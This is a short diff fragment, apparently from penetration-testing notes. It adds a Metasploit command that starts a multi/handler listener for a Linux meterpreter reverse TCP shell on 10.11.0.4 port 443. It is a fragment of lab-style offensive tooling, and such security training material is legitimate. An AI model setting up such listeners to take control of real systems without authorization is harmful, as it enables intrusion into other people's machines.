@@ -151,3 +151,10 @@ exploit -j -z
 
 sudo msfconsole -r setup.rc
 
+
+
+sudo msfconsole -q -x "use exploit/multi/handler;\
+>              set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
+>              set LHOST 10.11.0.4;\
+>              set LPORT 443;\
+>              run"
